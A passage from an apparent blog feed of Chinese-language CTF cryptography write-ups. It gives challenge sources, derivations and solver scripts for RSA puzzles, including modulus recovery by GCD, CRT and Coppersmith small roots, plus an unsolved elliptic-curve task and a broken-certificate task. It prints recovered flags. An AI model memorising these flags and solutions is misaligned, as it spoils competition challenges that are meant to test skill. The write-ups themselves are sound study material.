class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line">e = <span class="number">1009</span>*<span class="number">7</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;HECTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="不合格的魔药-unsolved"><a href="#不合格的魔药-unsolved" class="headerlink" title="不合格的魔药(unsolved)"></a>不合格的魔药(unsolved)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> Curve</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_function</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">512</span>)</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a = randrange(p)</span><br><span class="line">    b = randrange(q)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1 = randrange(p)</span><br><span class="line">        y1 = (x1**<span class="number">3</span> + a*x1) % p</span><br><span class="line">        x2 = randrange(n)</span><br><span class="line">        y2 = (x2**<span class="number">3</span> + a*x2 + b) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(y1,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y1,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">            yp = <span class="built_in">pow</span>(y1,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">            yq = <span class="built_in">pow</span>(y1,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">            _,s,t = gcdext(p,q)</span><br><span class="line">            y1 = (s*p*yq + t*q*yp) % p</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(y2,(p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(y2,(q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">                yp = <span class="built_in">pow</span>(y2,p//<span class="number">4</span>+<span class="number">1</span>,p)</span><br><span class="line">                yq = <span class="built_in">pow</span>(y2,q//<span class="number">4</span>+<span class="number">1</span>,q)</span><br><span class="line">                _,s,t = gcdext(p,q)</span><br><span class="line">                y2 = (s*p*yq + t*q*yp) % n</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    Ep = Curve(<span class="literal">None</span>, p, a, <span class="number">0</span>, <span class="literal">None</span>, x1, y1) </span><br><span class="line">    En = Curve(<span class="literal">None</span>, n, a, b, <span class="literal">None</span>, x2, y2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line">    hint1 = key * Ep.G</span><br><span class="line">    hint = [x1 ,hint1]</span><br><span class="line">    <span class="keyword">return</span> En, hint</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A_encrypt</span>(<span class="params">m, G, k</span>):</span><br><span class="line">    blocks = [m[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m) // <span class="number">16</span>)]</span><br><span class="line">    ciph = []</span><br><span class="line">    aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        c = aes.encrypt(blocks[i])</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">            G = G + G</span><br><span class="line">            ciph.append(G.x ^ bytes_to_long(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciph.append(G.y ^ bytes_to_long(c))</span><br><span class="line">    <span class="keyword">return</span> ciph               </span><br><span class="line"></span><br><span class="line">flag = secret.flag</span><br><span class="line">key = secret.key</span><br><span class="line"></span><br><span class="line">m = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ m+ <span class="string">b&#x27;&#125;&#x27;</span> == flag</span><br><span class="line">A, hint = A_function(key)</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">c = A_encrypt(m, A.G,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint =&quot;</span>, hint)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line"><span class="string">q = 7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line"><span class="string">a = 4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line"><span class="string">b = 5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line"><span class="string">hint = [5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403, </span></span><br><span class="line"><span class="string">        X: 0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line"><span class="string">        Y: 0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line"><span class="string">        (On curve &lt;None&gt;)]</span></span><br><span class="line"><span class="string">c = [36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820, 20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332, 19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277, 45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>还是曲线，没时间做了，看解出人数也是挺少的，而且还要做作业呢QWQ</p><h3 id="情书与破碎的证书-再留个坑？"><a href="#情书与破碎的证书-再留个坑？" class="headerlink" title="情书与破碎的证书(再留个坑？)"></a>情书与破碎的证书(再留个坑？)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小明喜欢上了小红，他使用rsa向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成16进制，以九个为一组用相同的方式打乱（转化时产生的0d0a换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</span><br><span class="line">提示1</span><br><span class="line">情书与破碎的证书 hint1:字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt() 解密密文（毕竟考点是证书）</span><br></pre></td></tr></table></figure><p>证书</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0d30000102bc048230010df78648862a090630a604820400050101018202000102a20482238d771399dbbd0001416e7fbd7f589b44151fb0c984549c1c4d948984f85c35934453bfbb4dbb99420f63f9cb8f577a7b60d67bdf84166c500fa7d6c6e484b75d97e308151b31a49c5bd77dd1d2d6711e50d9f5f7bc37d4e2235cfd76a522713c766e240aa2eb5fb45a9015d1dbd6a58b5b28861233ae4eb75a97ced0b78e91024d195adde08f7430b7f160d1d60a4f9d0801db74ebc8c23f9397251faac5500d216acc623e8f6ab212b5e6e9495d5ef6cee995fea98f40b1db2d356dd3c4d2612c64a1295bb23936fad66dc5662cb4ba6a8929591f6b14ce30d67df5ec35edb1f0973f746bcc5fc1ca921ee9660e04c6f286677b92e12b61ba310501030219e5085e5254046204000182020100</span><br><span class="line">中间被打碎了d48d90d80f02818051a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf0281800fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd02818025c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a2d2d2d2d2d454e442050524956415445204b45592d2d2d2d2d</span><br></pre></td></tr></table></figure><p><code>c</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6f4cb0df50eb133f104727316eb23e25463b6b46a1ff743507c7663094da88a091c77c1d686a91613fa2da697c23924798b40654ba420b9690c5ceb9a362cf48e72c39177c6a3ebecc4e0ba2b9673f070a23e535fff7a01b400381ede60a6f9bf86047b3dd2c663c329b9287749bdb3783303802129b93af083aa2045c500fe0c2a7a018c2403881115927ae56ff14338b9fb98d5a5f461916d962aea7c3379ec7f7d8d77b4cc8ff756895c1500d9f2cee3552f17216339b0d67f27e0dd07e9ec1861f14c962b977559561d709d57e58fd6e6aafd27892c6d43d16b3db267902b9ce8f9ff89a66ab822b5ea3a68c872a32c69961df15581b70c00e4c61804d0d</span><br></pre></td></tr></table></figure></p><p>我以为要手撕证书，去看了一下师兄的<a href="https://tover.xyz/p/pem-by-hand/">这篇</a><br>不行，放弃了，本来就是来看一眼题目的</p><p>以后再补吧(?)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;国城杯&quot;&gt;&lt;a href=&quot;#国城杯&quot; class=&quot;headerlink&quot; title=&quot;国城杯&quot;&gt;&lt;/a&gt;国城杯&lt;/h1&gt;&lt;p&gt;这次比赛的&lt;code&gt;web&lt;/code&gt;比较有难度(题解居然比&lt;code&gt;pwn&lt;/code&gt;少，而且是少很多很多)，交给学弟，然</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pcb2024-WriteUp</title>
    <link href="https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/11/10/pcb2024-WriteUp/</id>
    <published>2024-11-10T09:25:26.000Z</published>
    <updated>2025-08-26T09:27:33.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SOLVED"><a href="#SOLVED" class="headerlink" title="SOLVED"></a>SOLVED</h2><h3 id="babyenc-pcb2024"><a href="#babyenc-pcb2024" class="headerlink" title="babyenc-pcb2024"></a>babyenc-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">42</span></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(flag1.encode())</span><br><span class="line"><span class="built_in">print</span>(flag2.encode())</span><br><span class="line">m1 = bytes_to_long(flag1.encode())</span><br><span class="line">m2 = bytes_to_long(flag2.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e_gen</span>(<span class="params">bits</span>):</span><br><span class="line">    e = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        e.append(getPrime(bits))</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc1</span>(<span class="params">m, e, shift</span>):</span><br><span class="line">    n = next_prime(m &lt;&lt; shift)</span><br><span class="line">    tmp = getPrime(<span class="number">256</span>)</span><br><span class="line">    cc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">        cc.append(<span class="built_in">int</span>(<span class="built_in">pow</span>(tmp, e[i], n)))</span><br><span class="line">    <span class="keyword">return</span> cc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits)</span><br><span class="line">    q = getPrime(nbits)</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc2</span>(<span class="params">m, p, q, n</span>):</span><br><span class="line">    c = [<span class="built_in">pow</span>(m, p, n),<span class="built_in">pow</span>(m, q, n)]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">bits = <span class="number">6</span></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">e = e_gen(bits)</span><br><span class="line">shift = <span class="number">310</span></span><br><span class="line">c1 = enc1(m1,e,shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line">p, q = key_gen(nbits)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c2 = enc2(m2, p, q, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = [43, 37, 53, 61, 59]</span></span><br><span class="line"><span class="string">c1 = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]</span></span><br><span class="line"><span class="string">n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"><span class="string">c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>flag1</code>，我觉得就是<strong>共模攻击</strong>，但是不知<code>n</code>要求<code>n</code>，然后去大佬糖醋小鸡块那里翻了一下(共模攻击)，还真有<br><a href="https://tangcuxiaojikuai.xyz/post/9c1c22d0.html">https://tangcuxiaojikuai.xyz/post/9c1c22d0.html</a>的<strong>Middle_RSA2</strong>，还是需要多构造的</p><p>$c1\equiv m^{e1}mod\ n$<br>$c2\equiv m^{e2}mod\ n$<br>$c1^{-e2}<em>c2^{e1}\equiv 1mod\ n$<br>$c1^{e2}\equiv c2^{e1}mod\ n$<br>$c1^{e2}-c2^{e1}=k</em>n$<br>$GCD求n即可$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = [<span class="number">43</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">59</span>]</span><br><span class="line">c1 = [<span class="number">304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117</span>, <span class="number">300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224</span>,</span><br><span class="line">      <span class="number">294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531</span>, <span class="number">255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835</span>, <span class="number">194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978</span>]</span><br><span class="line">k1_n = c1[<span class="number">0</span>]**e[<span class="number">1</span>]-c1[<span class="number">1</span>]**e[<span class="number">0</span>]</span><br><span class="line">k2_n = c1[<span class="number">1</span>]**e[<span class="number">2</span>]-c1[<span class="number">2</span>]**e[<span class="number">1</span>]</span><br><span class="line">n = GCD(k1_n, k2_n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(n &gt;&gt; <span class="number">310</span>).decode())</span><br><span class="line"><span class="comment"># flag&#123;3e99c26b-efdd-4c</span></span><br></pre></td></tr></table></figure><p><code>flag2</code>，费马小定理化简得到，$c2[0]\equiv m(mod\ p)$，$c2[1]\equiv m(mod\ q)$<br>参考<a href="https://blog.csdn.net/shshss64/article/details/130036481">博客</a></p><p>$方法1：此处不化简$<br>$c2[0]^{n}\equiv c2[1]^{p^{2}}mod\ n$<br>$c2[0]^{n}\equiv c2[1]mod\ p$<br>$p=GCD(pow(c2[0],n,n)-c2[1],n)$<br>$之后中国剩余定理求解m$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line">c2 = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>,</span><br><span class="line">      <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">p = GCD(<span class="built_in">pow</span>(c2[<span class="number">0</span>], n, n)-c2[<span class="number">1</span>], n)</span><br><span class="line">q = n // p</span><br><span class="line">flag = crt([p, q], [c2[<span class="number">0</span>], c2[<span class="number">1</span>]])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag[<span class="number">0</span>]).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><p>$方法2：此次化简得到$<br>$c2[0]=m+k_{1}p$<br>$c2[1]=m+k_{2}q$<br>$1:\ c2[0]<em>c2[1]=m^{2}+(k_{1}p+k_{2}q)</em>m+k_{1}p<em>k_{2}q$<br>$2:\ m</em>(c2[0]+c2[1])=2<em>m^{2}+(k_{1}p+k_{2}q)</em>m$<br>$1-2:\ m^{2}-m<em>(c2[0]+c2[1])+c2[0]</em>c2[1]\equiv 0(mod\ n)$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">P,Q = [<span class="number">12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364</span>, <span class="number">13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932</span>]</span><br><span class="line">n = <span class="number">16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067</span></span><br><span class="line"></span><br><span class="line">PR.&lt;m&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = m^<span class="number">2</span> - (P+Q)*m + P*Q</span><br><span class="line">x0 = f.small_roots()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(x0[<span class="number">0</span>])).decode())</span><br><span class="line"><span class="comment"># d2-bbe5-1420eaaa3b30&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ezrsa-pcb2024"><a href="#ezrsa-pcb2024" class="headerlink" title="ezrsa-pcb2024"></a>ezrsa-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_flag</span>(<span class="params">flag, bits=<span class="number">1024</span></span>):</span><br><span class="line">    pad = os.urandom(bits//<span class="number">8</span> - <span class="built_in">len</span>(flag))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(flag + pad, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">p,q = [getPrime(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[<span class="number">1</span>:]] </span><br><span class="line">a,b = [randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;RSA&quot;</span>[:-<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = pad_flag(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(p + b * q)</span><br><span class="line"><span class="built_in">print</span>(a * p + q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 